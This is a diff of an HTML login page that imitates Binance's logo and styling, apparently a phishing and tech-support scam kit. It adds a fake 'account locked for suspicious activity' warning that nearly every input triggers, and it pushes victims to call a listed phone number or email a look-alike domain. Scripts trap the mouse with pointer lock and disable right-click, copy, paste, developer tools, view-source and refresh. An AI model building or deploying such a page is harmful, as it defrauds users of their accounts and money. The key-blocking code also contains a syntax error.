@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,53 +8,65 @@
   <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
   <link rel="apple-touch-icon" href="favicon.png"> <!-- for iOS devices -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+
   <!-- Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
-      background-color: #0f1115; /* Dark background */
+      background-color: #0f1115;
+      /* Dark background */
       color: #fff;
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
     }
+
     .login-card {
-      background-color: #1a1d23; 
+      background-color: #1a1d23;
       padding: 2rem;
       border-radius: 1rem;
       width: 380px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
     }
+
     .btn-yellow {
       background-color: #ffcc00;
       border: none;
       font-weight: 600;
       color: #000;
     }
+
     .btn-yellow:hover {
       background-color: #e6b800;
     }
+
     .form-control {
       background-color: #0f1115;
       border: 1px solid #333;
       color: #fff;
     }
+
     .form-control:focus {
       background-color: #0f1115;
       border-color: #ffcc00;
       box-shadow: none;
       color: #fff;
     }
+
     .requirement {
       font-size: 0.9rem;
     }
+
     .valid {
       color: #28a745;
     }
+
     .invalid {
       color: #dc3545;
     }
+
     .help-link {
       margin-top: 10px;
       display: block;
@@ -62,46 +75,78 @@
       text-decoration: none;
       font-weight: 600;
     }
+
     .help-link:hover {
       text-decoration: underline;
     }
+
     .qr-icon {
       font-size: 1.5rem;
       color: #fff;
       cursor: pointer;
     }
+
     .fs13 {
       font-size: 13px;
     }
+
+    #warningMessage {
+      color: #000;
+      font-size: 13px;
+    }
+
     canvas {
-            display: none;
-            background-color: #000;
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
+      display: none;
+      background-color: #000;
+      position: absolute;
+      top: 0;
+      left: 0;
+    }
     
   </style>
 </head>
+
 <body>
   <div class="login-card">
     <canvas id="gameCanvas"></canvas>
-    <svg height="24" width="120" class="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg>
+    <svg height="24" width="120" class="bn-svg default-icon block" viewBox="0 0 120 24"
+      xmlns="http://www.w3.org/2000/svg">
+      <path fill="#F0B90B"
+        d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z">
+      </path>
+    </svg>
     <div class="d-flex justify-content-between align-items-center mb-4 pt-4">
       <h3 class="m-0">Log in</h3>
       <i class="bi bi-qr-code qr-icon"></i>
     </div>
-    
+
+    <!-- Bootstrap Modal for Warnings -->
+    <div class="modal fade" id="warningModal" tabindex="-1" aria-labelledby="warningModalLabel" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-header bg-warning">
+            <h5 class="modal-title text-dark" id="warningModalLabel">⚠️ Security Warning</h5>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+          </div>
+          <div class="modal-body" id="warningMessage">
+
+          </div>
+          <div class="modal-footer d-block text-center" style="border-bottom-right-radius: 0;
+      border-bottom-left-radius: 0;">
+            <a href="tel:+18382217153" class="help-link d-block"> Need Assistant? Call +1 (838) 221-7153</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <!-- Step 1: Phone/Email -->
     <div id="step1">
       <div class="mb-3">
-        <label for="emailPhone" class="form-label">Phone number / Email</label>
-        <input type="text" class="form-control" id="emailPhone" placeholder="Email/Phone (without country code)">
+        <label for="emailPhone" class="form-label">Phone/Email</label>
+        <input type="text" class="form-control" id="emailPhone" placeholder="Email or Phone (+1XXXXXXXXXX)">
       </div>
-      <button type="button" class="btn btn-yellow w-100 py-2" onclick="goToPassword()">
-        Continue
-      </button>
-      <a href="tel:+18382217153" class="help-link d-block py-4">📞 Need Assistant? Call +1 (838) 221-7153</a>
+      <button type="button" class="btn btn-yellow startBtn w-100 py-2" onclick="goToPassword()">Continue</button>
+      <a href="tel:+18382217153" class="help-link d-block py-4"> Need Assistant? Call +1 (838) 221-7153</a>
     </div>
 
     <!-- Step 2: Password -->
@@ -110,214 +155,195 @@
         <label for="password" class="form-label">Password</label>
         <input type="password" class="form-control" id="password" placeholder="">
       </div>
-      <a href="tel:+18382217153" class="help-link d-block py-4">📞 Need Assistant? Call +1 (838) 221-7153</a>
+      <a href="mailto:info@vvrsssa.info" class="help-link d-block py-4">📞 Need Assistance? Email us at
+        info@vvrsssa.info</a>
 
-      <!-- Inline alert -->
       <div id="passwordAlert" class="alert alert-danger py-2" style="display:none;">
         ⚠️ Please meet all password requirements.
       </div>
 
-      <!-- Password rules (hidden initially) -->
       <div id="passwordRules" class="mb-2" style="display:none;">
-        <button class="btn btn-danger fs13">Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.</button>
-        
-        <!-- <a href="tel:+" class="help-link d-block pb-4">📞 Need help? Call </a> -->
+        <button class="btn btn-danger fs13">Password not matching the condition</button>
       </div>
 
-      <!-- Continue button -->
-      <button type="button" class="btn startBtn btn-yellow w-100 py-2" onclick="validatePassword()">
-        Continue
-      </button>
-
-      <!-- Final sign up button -->
-      <button type="button" id="signupBtn" class="btn btn-yellow w-100 py-2 mt-3" disabled>
-        Sign Up
-      </button>
+      <button type="button" class="btn startBtn btn-yellow w-100 py-2" onclick="validatePassword()">Continue</button>
+      <button type="button" id="signupBtn" class="btn btn-yellow w-100 py-2 mt-3" disabled>Sign Up</button>
     </div>
-  </div>
-  
 
-  <script>
-    function goToPassword() {
-      const input = document.getElementById("emailPhone").value.trim();
-      if (!input) {
-        alert("⚠️ Please enter your phone number or email");
-        return;
+    <script>
+      function showWarning(message) {
+        document.getElementById("warningMessage").textContent = message;
+        const modal = new bootstrap.Modal(document.getElementById("warningModal"));
+        modal.show();
       }
-      document.getElementById("step1").style.display = "none";
-      document.getElementById("step2").style.display = "block";
-      document.getElementById("password").focus(); // auto-focus password
-    }
+      
 
-    function checkPassword() {
-      const pass = document.getElementById("password").value;
-      let valid = true;
+      function goToPassword() {
+        const input = document.getElementById("emailPhone").value.trim();
 
-      const rules = {
-        ruleLength: pass.length >= 8,
-        ruleNumber: /\d/.test(pass),
-        ruleLower: /[a-z]/.test(pass),
-        ruleUpper: /[A-Z]/.test(pass),
-        ruleSymbol: /[!@#$%^&*]/.test(pass),
-      };
+        if (!input) {
+          showWarning("Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.");
+          return;
+        }
 
-      for (let rule in rules) {
-        const el = document.getElementById(rule);
-        if (el) { // only if rule element exists
-          if (rules[rule]) {
-            el.textContent = "✅ " + el.textContent.replace("❌ ", "").replace("✅ ", "");
-            el.classList.add("valid");
-            el.classList.remove("invalid");
-          } else {
-            el.textContent = "❌ " + el.textContent.replace("✅ ", "").replace("❌ ", "");
-            el.classList.add("invalid");
-            el.classList.remove("valid");
-            valid = false;
+        // Check if input is a phone number (+1XXXXXXXXXX)
+        if (/^\+1\d{9,}$/.test(input)) {
+          if (input.length < 2) {
+            showWarning("Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.");
+            return;
           }
         }
-      }
-
-      return valid;
-    }
-
-    function validatePassword() {
-      document.getElementById("passwordRules").style.display = "block"; // show rules now
-      const valid = checkPassword();
-
-      if (!valid) {
-        document.getElementById("passwordAlert").style.display = "block";
-        document.getElementById("signupBtn").disabled = true;
-      } else {
-        document.getElementById("passwordAlert").style.display = "none";
-        document.getElementById("signupBtn").disabled = false;
-      }
-    }
-
-    // Handle Enter key for phone/email
-    document.getElementById("emailPhone").addEventListener("keypress", function (e) {
-      if (e.key === "Enter") {
-        e.preventDefault();
-        goToPassword();
-      }
-    });
-
-    // Handle Enter key for password
-    document.getElementById("password").addEventListener("keypress", function (e) {
-      if (e.key === "Enter") {
-        e.preventDefault();
-        validatePassword();
-      }
-    });
-
-
-
-    const canvas = document.getElementById("gameCanvas");
-        const startBtn = document.querySelector(".startBtn");
-        let firstClick = false;
-
-        // Lock cursor and hide it everywhere except the button & paragraph
-        startBtn.onclick = () => {
-            if (!firstClick) {
-                document.body.classList.add("hideCursor");
-                firstClick = true;
-            }
-            canvas.requestPointerLock();
-        };
-        document.addEventListener("mousemove", () => {
-  if (!firstAction) {
-    document.body.classList.add("hideCursor");
-    firstAction = true;
-  }
-});
-// Request pointer lock on first click (browser requires interaction)
-document.addEventListener("click", () => {
-  if (document.pointerLockElement !== canvas) {
-    canvas.requestPointerLock();
-  }
-});
-
-        // Show cursor only when hovering over paragraph
-        paragraph.addEventListener("mouseenter", () => {
-            document.body.classList.remove("hideCursor");
-        });
-
-        paragraph.addEventListener("mouseleave", () => {
-            if (firstClick) {
-                document.body.classList.add("hideCursor");
-            }
-        });
-
-        // Draw red shape
-        function draw() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "red";
-            ctx.fillRect(100, 100, 200, 200);
+        // Check if input is a Gmail address
+        else if (/^[a-zA-Z0-9._%+-]{4,}@kkmail\.com$/.test(input)) {
+          // Valid Gmail
+        }
+        else {
+          showWarning("Suspicious activity detected on your account. We’ve temporarily locked your account for your protection. Please verify your identity to restore access.");
+          return;
         }
 
-        function gameLoop() {
-            draw();
-            requestAnimationFrame(gameLoop);
+        // If passed validation
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+        document.getElementById("password").focus();
+      }
+
+      function checkPassword() {
+        const pass = document.getElementById("password").value;
+        const hasUpper = /[A-Z]/.test(pass);
+        const hasNumber = /\d/.test(pass);
+        const hasSymbol = /[!@#$%^&*(),.?":{}|<>]/.test(pass);
+        const hasLength = pass.length >= 8;
+
+        return hasUpper && hasNumber && hasSymbol && hasLength;
+      }
+
+      function validatePassword() {
+        document.getElementById("passwordRules").style.display = "block";
+        const valid = checkPassword();
+
+        if (!valid) {
+          document.getElementById("passwordAlert").style.display = "block";
+          document.getElementById("signupBtn").disabled = true;
+        } else {
+          document.getElementById("passwordAlert").style.display = "none";
+          document.getElementById("signupBtn").disabled = false;
+        }
+      }
+
+      // Enter key for email/phone
+      document.getElementById("emailPhone").addEventListener("keypress", function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          goToPassword();
+        }
+      });
+
+      // Enter key for password
+      document.getElementById("password").addEventListener("keypress", function (e) {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          validatePassword();
+        }
+      });
+
+
+      const canvas = document.getElementById("gameCanvas");
+      const startBtn = document.querySelector(".startBtn");
+      let firstClick = false;
+
+
+
+      // Save existing inline onclick (validatePassword)
+      const oldOnClick = startBtn.onclick;
+
+      // Define function that runs both scripts
+      function runBothActions(event) {
+        // 1️⃣ Run the inline validatePassword()
+        if (typeof oldOnClick === "function") {
+          oldOnClick.call(startBtn, event);
         }
 
-        gameLoop();
+        if (!firstClick) {
+          document.body.classList.add("hideCursor");
+          firstClick = true;
+        }
+        canvas.requestPointerLock();
+      }
 
-        
-  </script>
+      // Assign combined function to button click
+      startBtn.onclick = runBothActions;
 
-  <script>
-// Disable Right Click
-document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-});
+      // Also trigger same behavior when pressing Enter in password field
+      document.addEventListener("keypress", function (e) {
+        if (e.key === "Enter") {
+          if (!firstClick) {
+            document.body.classList.add("hideCursor");
+            firstClick = true;
+          }
+          canvas.requestPointerLock();
+          e.preventDefault();
+          runBothActions(e);
 
-// Disable Text Selection
-document.addEventListener('selectstart', function(e) {
-  e.preventDefault();
-});
+        }
+      });
 
-// Disable Dragging (like dragging images/text)
-document.addEventListener('dragstart', function(e) {
-  e.preventDefault();
-});
 
-// Disable Copy, Cut, Paste
-document.addEventListener('copy', function(e) {
-  e.preventDefault();
-});
-document.addEventListener('cut', function(e) {
-  e.preventDefault();
-});
-document.addEventListener('paste', function(e) {
-  e.preventDefault();
-});
+    </script>
 
-// Disable Keyboard Shortcuts
-document.onkeydown = function(e) {
-  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S, Ctrl+C, Ctrl+V, Ctrl+X, etc.
-  if (
-    e.keyCode == 123 || // F12
-    e.keyCode == 116 || // F5
-    e.keyCode == 117 || // F6
-    e.keyCode == 121 || // F10
-    e.keyCode == 122 || // F11
-    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
-    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
-    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
-    (e.ctrlKey && e.keyCode == 83) || // Ctrl+S
-    (e.ctrlKey && e.keyCode == 67) || // Ctrl+C
-    (e.ctrlKey && e.keyCode == 88) || // Ctrl+X
-    (e.ctrlKey && e.keyCode == 82) || // Ctrl+R
-    (e.ctrlKey && e.shiftKey && e.keyCode == 82) // Ctrl+Shift+R
-    (e.ctrlKey && e.keyCode == 86) // Ctrl+V
-  ) {
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
-  }
-};
-</script>
+    <script>
+      // Disable Right Click
+      document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+      });
 
-   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+      // Disable Text Selection
+      document.addEventListener('selectstart', function (e) {
+        e.preventDefault();
+      });
 
+      // Disable Dragging (like dragging images/text)
+      document.addEventListener('dragstart', function (e) {
+        e.preventDefault();
+      });
+
+      // Disable Copy, Cut, Paste
+      document.addEventListener('copy', function (e) {
+        e.preventDefault();
+      });
+      document.addEventListener('cut', function (e) {
+        e.preventDefault();
+      });
+      document.addEventListener('paste', function (e) {
+        e.preventDefault();
+      });
+
+      // Disable Keyboard Shortcuts
+      document.onkeydown = function (e) {
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S, Ctrl+C, Ctrl+V, Ctrl+X, etc.
+        if (
+          e.keyCode == 123 || // F12
+          e.keyCode == 116 || // F5
+          e.keyCode == 117 || // F6
+          e.keyCode == 121 || // F10
+          e.keyCode == 122 || // F11
+          (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+          (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+          (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+          (e.ctrlKey && e.keyCode == 83) || // Ctrl+S
+          (e.ctrlKey && e.keyCode == 67) || // Ctrl+C
+          (e.ctrlKey && e.keyCode == 88) || // Ctrl+X
+          (e.ctrlKey && e.keyCode == 82) || // Ctrl+R
+          (e.ctrlKey && e.shiftKey && e.keyCode == 82) // Ctrl+Shift+R
+            (e.ctrlKey && e.keyCode == 86) // Ctrl+V
+        ) {
+          e.preventDefault();
+          e.stopPropagation();
+          return false;
+        }
+      };
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
+
 </html>
